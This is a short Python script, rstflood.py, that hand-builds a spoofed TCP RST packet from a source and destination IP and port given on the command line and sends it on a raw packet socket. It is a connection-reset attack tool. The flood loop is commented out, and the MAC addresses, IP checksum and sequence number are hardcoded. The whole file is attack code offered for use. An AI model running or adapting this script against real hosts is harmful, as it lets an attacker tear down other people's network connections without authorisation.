import socket
import sys, getopt
from binascii import hexlify
from struct import *

def usage():
    sys.stdout.write("Usage\npython rstflood.py <device> <src ip> <src port> <dst ip> <dst port>\n")

def eth_addr (a) :
  b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]), ord(a[4]) , ord(a[5]))
  return b

def hex_mac_addr (a) :
  b = "%.2s:%.2s:%.2s:%.2s:%.2s:%.2s" % (chr(a[0]) , chr(a[1]) , chr(a[2]), chr(a[3]), chr(a[4]) , chr(a[5]))
  return b

def convip(ip):
    i = ip.split('.')
    c = []
    for e in i:
        t = int(e)
        c.append(t)
    return c

def convport(port):
    l = []
    if int(port) <= 255:
        l.append(0x00)
        l.append(int(port))
    elif int(port) < 65536:
        l = [0x00, 0x00]
        tmp = int(port) / 256
        ex = int(port) % 256
        l[0] = l[0] + tmp
        l[1] = l[1] + ex
    return l

def rst_flood(device, srcip, srcport, dstip, dstport):
    eth_pkt = [0x58, 0x6d, 0x8f, 0x99, 0x0a, 0xa6, 0x18, 0x65, 0x90, 0xda, 0x38, 0xdb, 0x08, 0x00 ]
    ip_hdr_primer = [0x45, 0x00, 0x00, 0x28, 0x53, 0xf4, 0x40, 0x00 ]
    ip_ttl_protocol_checksum = [ 0x40, 0x06, 0xf2, 0xfd ]
    ip_src = convip(srcip)
    ip_dst = convip(dstip)
    tcp_src_port = convport(srcport)
    tcp_dst_port = convport(dstport)
    tcp_hdr_end = [ 0xd3, 0x42, 0xff, 0xed, 0x00, 0x00, 0x00, 0x00, 0x50, 0x04, 0x00, 0x00, 0x2d, 0x87, 0x00, 0x00 ]
	
    eth_payload = "".join(map(chr, eth_pkt))
    ip_payload = "".join(map(chr, ip_hdr_primer + ip_ttl_protocol_checksum + ip_src + ip_dst))
    tcp_payload = "".join(map(chr, tcp_src_port + tcp_dst_port + tcp_hdr_end))
    rst_pkt = eth_payload + ip_payload + tcp_payload

    #while True:
    rst_flood_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    rst_flood_socket.bind((device, 0))
    rst_flood_socket.send(rst_pkt)

if len(sys.argv) == 6:
    device = sys.argv[1]
    srcip = sys.argv[2]
    srcport = sys.argv[3]
    dstip = sys.argv[4]
    dstport = sys.argv[5]
    rst_flood(device, srcip, srcport, dstip, dstport)
else:
    usage()
